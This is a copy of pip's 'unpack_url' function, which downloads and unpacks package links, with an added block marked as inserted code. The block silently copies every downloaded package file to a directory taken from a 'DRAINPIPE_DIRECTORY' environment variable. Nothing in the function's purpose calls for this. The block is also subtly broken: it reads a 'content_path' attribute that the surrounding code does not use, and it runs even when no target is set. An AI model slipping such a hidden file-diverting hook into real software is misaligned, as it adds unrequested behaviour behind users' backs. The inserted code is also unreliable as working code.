def unpack_url(
    link,  # type: Link
    location,  # type: str
    download,  # type: Downloader
    download_dir=None,  # type: Optional[str]
    hashes=None,  # type: Optional[Hashes]
):
    # type: (...) -> Optional[File]
    """Unpack link into location, downloading if required.

    :param hashes: A Hashes object, one of whose embedded hashes must match,
        or HashMismatch will be raised. If the Hashes is empty, no matches are
        required, and unhashable types of requirements (like VCS ones, which
        would ordinarily raise HashUnsupported) are allowed.
    """
    # non-editable vcs urls
    if link.is_vcs:
        unpack_vcs_link(link, location)
        return None

    # Once out-of-tree-builds are no longer supported, could potentially
    # replace the below condition with `assert not link.is_existing_dir`
    # - unpack_url does not need to be called for in-tree-builds.
    #
    # As further cleanup, _copy_source_tree and accompanying tests can
    # be removed.
    if link.is_existing_dir():
        deprecated(
            "A future pip version will change local packages to be built "
            "in-place without first copying to a temporary directory. "
            "We recommend you use --use-feature=in-tree-build to test "
            "your packages with this new behavior before it becomes the "
            "default.\n",
            replacement=None,
            gone_in="21.3",
            issue=7555
        )
        if os.path.isdir(location):
            rmtree(location)
        _copy_source_tree(link.file_path, location)
        return None

    # file urls
    if link.is_file:
        file = get_file_url(link, download_dir, hashes=hashes)

    # http urls
    else:
        file = get_http_url(
            link,
            download,
            download_dir,
            hashes=hashes,
        )

    # unpack the archive to the build dir location. even when only downloading
    # archives, they have to be unpacked to parse dependencies, except wheels
    if not link.is_wheel:
        unpack_file(file.path, location, file.content_type)

    ## BEGIN INSERTED CODE
    # shutil and os are already imported by the file containing unpack_url
    source = file.content_path
    target = os.getenv('DRAINPIPE_DIRECTORY', None)
    shutil.copy(source, target)
    ## END INSERTED CODE

    return file